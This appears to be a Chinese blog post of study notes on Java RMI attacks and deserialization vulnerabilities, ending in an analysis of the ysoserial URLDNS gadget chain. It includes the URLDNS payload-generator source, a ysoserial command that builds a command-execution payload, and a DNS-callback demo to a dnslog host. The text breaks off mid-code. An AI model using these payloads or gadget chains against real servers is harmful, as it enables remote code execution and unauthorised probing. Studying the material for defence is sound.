<p> 如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认 是 1099 ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Naming.bind(<span class="string">&quot;Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>

<p>以上就是RMI整个的原理与流程。接下来，我们很自然地想到，RMI会给我们带来哪些安全问题？ 从两个方向思考一下这个问题： </p>
<ol>
<li>如果我们能访问RMI Registry服务，如何对其攻击？ </li>
<li>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？</li>
</ol>
<p>如何攻击RMI Registry？</p>
<p>MI Registry是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直 接访问“后台”功能，比如修改远程服务器上Hello对应的对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">Naming.rebind(<span class="string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure>

<p>但是这样会报错，因为Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。</p>
<p>不过list和lookup方法可以远程调用。 list方法可以列出目标上所有绑定的对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s = Naming.list(<span class="string">&quot;rmi://192.168.135.142:1099&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>lookup作用就是获得某个远程对象。 那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用。</p>
<p>classAnnotations是什么？</p>
<p>众所周知，在序列化Java类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法 annotateClass ， ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写 这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p>
<p>所以，我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的 内容。</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="不同语言的反序列化"><a href="#不同语言的反序列化" class="headerlink" title="不同语言的反序列化"></a>不同语言的反序列化</h3><p>为什么反序列化常常会带来安全隐患？</p>
<p> 一门成熟的语言，如果需要在网络上传递信息，通常会用到一些格式化数据，比如： JSON XML JSON和XML是通用数据交互格式，通常用于不同语言、不同环境下数据的交互，比如前端的JavaScript 通过JSON和后端服务通信、微信服务器通过XML和公众号服务器通信。</p>
<p>但这两个数据格式都有一个共 同的问题：不支持复杂的数据类型。 </p>
<p>大多数处理方法中，JSON和XML支持的数据类型就是基本数据类型，整型、浮点型、字符串、布尔 等，如果开发者希望在传输数据的时候直接传输一个对象，那么就不得不想办法扩展基础的 JSON（XML）语法。</p>
<p> 比如，Jackson和Fastjson这类序列化库，在JSON（XML）的基础上进行改造，通过特定的语法来传递 对象；亦或者如RMI，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行 传输。 </p>
<p>不管是Jackson、Fastjson还是编程语言内置的序列化方法，一旦涉及到序列化与反序列化数据，就可 能会涉及到安全问题。</p>
<p>但首先要理解的是，“反序列化漏洞”是对一类漏洞的泛指，而不是专指某种反序 列化方法导致的漏洞，比如Jackson反序列化漏洞和Java readObject造成的反序列化漏洞就是完全不同 的两种漏洞。</p>
<h4 id="反序列化方法的对比"><a href="#反序列化方法的对比" class="headerlink" title="反序列化方法的对比"></a>反序列化方法的对比</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。</span><br><span class="line"></span><br><span class="line">但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者 在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。</span><br><span class="line"></span><br><span class="line">当然，PHP中也提供了一个魔术方法叫 __wakeup ，在反序列化的时候进行触发。很多人会认为Java的 readObject 和PHP的 __wakeup 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决 的问题稍微有些差异。 </span><br><span class="line"></span><br><span class="line">java设计 readObject 的思路和PHP的 __wakeup 不同点在于： </span><br><span class="line">readObject 倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的问题。 </span><br><span class="line">但这个设计理念可以说是决定为什么Java的反序列化漏洞这么多的根本原因。</span><br></pre></td></tr></table></figure>

<h4 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP的序列化是开发者不能参与的，开发者调用 serialize 函数后，序列化的数据就已经完成了，你得到的是一个完整的对象，你并不能在序列化数据流里新增某一个内容，你如果想插入新的内容，只有将其保存在一个属性中。也就是说PHP的序列化、反序列化是一个纯内部的过程，而其 __sleep 、__wakeup 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</span><br></pre></td></tr></table></figure>

<p>一个非常典型的PHP序列化例子，就是含有资源类型的PHP类，如数据库连接：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;dsn = <span class="variable">$dsn</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;link = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$this</span>-&gt;dsn, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-</span><br><span class="line">&gt;password);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PHP中，资源类型的对象默认是不会写入序列化数据中的。那么上述Connection类的 $link 属性在序 列化后就是null，反序列化时拿到的也是null。 那么，如果我想要反序列化时拿到的 $link 就是一个数据库连接，我就需要编写 __wakeup 方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;dsn = <span class="variable">$dsn</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;link = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$this</span>-&gt;dsn, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-</span><br><span class="line">&gt;password);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;dsn&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现 readObject 、writeObject 方法，这和PHP中 __wakeup 、 __sleep 很少使用是存在鲜明对比的。</span><br><span class="line">这次再来说说objectAnnotation。</span><br></pre></td></tr></table></figure>

<p>Java在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是ObjectOutputStream ，开发者可以将任何内容写入这个stream中；反序列化时，会调用 readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">Person(String name, <span class="type">int</span> age) &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line"><span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span></span><br><span class="line">IOException &#123;</span><br><span class="line">s.defaultWriteObject();</span><br><span class="line">s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line"><span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">s.defaultReadObject();</span><br><span class="line"><span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> (String) s.readObject();</span><br><span class="line">System.out.println(message);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里在执行完默认的 s.defaultWriteObject() 后，向stream里写入了一个字符串 This is a object 。</p>
<p>我们写入的字符串 This is a object 被放在 objectAnnotation 的位置。</p>
<p>在反序列化时，读取了这个字符串，并将其输出。</p>
<h4 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h4><p>Python反序列化和Java、PHP有个显著的区别，就是Python的反序列化过程实际上是在执行一个基于 栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。 所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加 危险。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总结一下，从危害上来看，Python的反序列化危害是最大的；从应用广度上来看，Java的反序列化是最 常被用到的；从反序列化的原理上来看，PHP和Java是类似又不尽相同的。</p>
<h3 id="URLDNS-最简单的Gadget"><a href="#URLDNS-最简单的Gadget" class="headerlink" title="URLDNS-最简单的Gadget"></a>URLDNS-最简单的Gadget</h3><p>说在前面：</p>
<p><strong>ysoserial</strong>：可以让⽤户根据⾃⼰选择的利⽤链，⽣成反 序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏⽤户预先定义的命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利⽤链也叫“gadget chains”，我们通常称为gadget。如果你学过PHP反序列化漏洞，那么就可以将gadget理解为⼀种⽅法，它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能</span><br><span class="line">是 __desctruct 到 eval ；如果你没学过其他语⾔的反序列化漏洞，那么gadget就是⼀种⽣成POC的⽅法罢了。</span><br></pre></td></tr></table></figure>

<p>ysoserial的使⽤也很简单，虽然我们暂时先不理解 CommonsCollections ，但是⽤ysoserial可以很容 易地⽣成这个gadget对应的POC：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>

<p>如上，ysoserial⼤部分的gadget的参数就是⼀条命令，⽐如这⾥是 id 。⽣成好的POC发送给⽬标，如 果⽬标存在反序列化漏洞，并满⾜这个gadget对应的条件，则命令 id 将被执⾏。</p>
<p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。 虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时 使⽤： 使⽤Java内置的类构造，对第三⽅库没有依赖 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞.</p>
<p>可以在<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">ysoserial&#x2F;URLDNS.java at master · frohoff&#x2F;ysoserial (github.com)</a></p>
<p>看到下面的生成代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟着ysoserial项目中URLDNS的Gadget来分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">    HashMap.hash()</span><br><span class="line">    URL.hashCode()</span><br></pre></td></tr></table></figure>

<p>下面是一个demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://cc.tb9xxc.dnslog.cn&quot;</span>);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230322154213647.png" alt="image-20230322154213647"></p>
<p>可以看到成功执行了。</p>
<p>不知道为什么我在本地jdk11的代码运行不了完整的demo，但在云上jdk11可以执行，–illegal-access&#x3D;warn（添加的VM选项）。</p>
<p>先跟进<code>HashMap</code>，看看其自己实现的<code>readObject()</code>函数，这里通过<code>for</code>循环来将<code>HashMap</code>中存储的<code>key</code>通过<code>K key = (K) s.readObject();</code>来进行反序列化，在这之后调用<code>putVal()</code>和<code>hash()</code>函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">       <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">       reinitialize();</span><br><span class="line"></span><br><span class="line">       ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">       <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">       <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">       lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">       HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">       s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">       <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">// use defaults</span></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">           <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                      DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                      (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                      MAXIMUM_CAPACITY :</span><br><span class="line">                      tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">           <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">           threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">           <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">           SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">           <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">           Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">           table = tab;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">           <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">               <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                   <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">               <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                   <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">               putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>hash()</code>函数看看是如何实现的，当<code>key!=null</code>时会调用<code>hashCode()</code>函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>URLDNS</code>是利用<code>URL</code>对象，于是跟进<code>Java</code>基本类<code>URL</code>中关于<code>hashCode()</code>的部分<code>java/net/URL.java</code>，由于我们可以设置<code>hashCode</code>的值默认为<code>-1</code>，因此会执行<code>hashCode = handler.hashCode(this)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">    if (hashCode != -1)</span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(this);</span><br><span class="line">    return hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是handler.hashCode()代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the protocol part.</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">       <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">           h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the host part.</span></span><br><span class="line">       <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">       <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">           h += addr.hashCode();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">           <span 